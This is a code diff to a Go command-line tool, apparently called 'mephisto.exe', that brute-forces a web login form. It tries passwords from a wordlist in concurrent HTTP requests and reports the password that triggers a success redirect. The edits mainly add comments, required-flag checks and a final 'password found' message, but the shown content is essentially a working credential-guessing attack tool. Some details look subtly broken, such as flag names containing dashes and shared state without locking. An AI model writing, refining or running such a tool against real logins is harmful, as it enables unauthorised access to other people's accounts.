@@ -13,8 +13,9 @@ import (
 func attemptLogin(targetURL, username, password, successRedirect string, wg *sync.WaitGroup, found *bool, foundPassword *string) {
 	defer wg.Done()
 
+	// If a password has already been found, skip further attempts
 	if *found {
-		return // Skip further attempts if a key is already found
+		return
 	}
 
 	client := &http.Client{}
@@ -32,7 +33,7 @@ func attemptLogin(targetURL, username, password, successRedirect string, wg *syn
 	}
 	defer resp.Body.Close()
 
-	// Check if the redirect matches the successRedirect
+	// Check if the request was redirected to the success URL
 	if resp.Request.URL.String() == successRedirect {
 		fmt.Printf("KEY FOUND [%s]\n", password)
 		*found = true
@@ -42,16 +43,17 @@ func attemptLogin(targetURL, username, password, successRedirect string, wg *syn
 
 func main() {
 	// Define command-line flags
-	username := flag.String("l", "", "Username")
-	passwordList := flag.String("P", "", "Password list file")
-	redirectURL := flag.String("--redirect", "", "Success redirect URL")
-	targetURL := flag.String("--url", "", "Target URL for brute-forcing")
+	username := flag.String("l", "", "Username (required)")
+	passwordList := flag.String("P", "", "Password list file (required)")
+	redirectURL := flag.String("--redirect", "", "Success redirect URL (required)")
+	targetURL := flag.String("--url", "", "Target URL for brute-forcing (required)")
 	flag.Parse()
 
-	// Validate inputs
+	// Validate mandatory flags
 	if *username == "" || *passwordList == "" || *targetURL == "" || *redirectURL == "" {
 		fmt.Println("Usage: mephisto.exe -l username -P passwordlist --url target_url --redirect success_url")
-		return
+		flag.PrintDefaults()
+		os.Exit(1)
 	}
 
 	// Open the password list file
@@ -71,7 +73,7 @@ func main() {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		if found {
-			break
+			break // Stop if a valid password is already found
 		}
 
 		password := scanner.Text()
@@ -79,13 +81,16 @@ func main() {
 		go attemptLogin(*targetURL, *username, password, *redirectURL, &wg, &found, &foundPassword)
 	}
 
-	wg.Wait()
+	wg.Wait() // Wait for all goroutines to complete
 
 	if scanner.Err() != nil {
 		fmt.Printf("Error reading password file: %v\n", scanner.Err())
 	}
 
-	if !found {
+	// Final result
+	if found {
+		fmt.Printf("Password successfully found: [%s]\n", foundPassword)
+	} else {
 		fmt.Println("KEY NOT FOUND")
 	}
 }
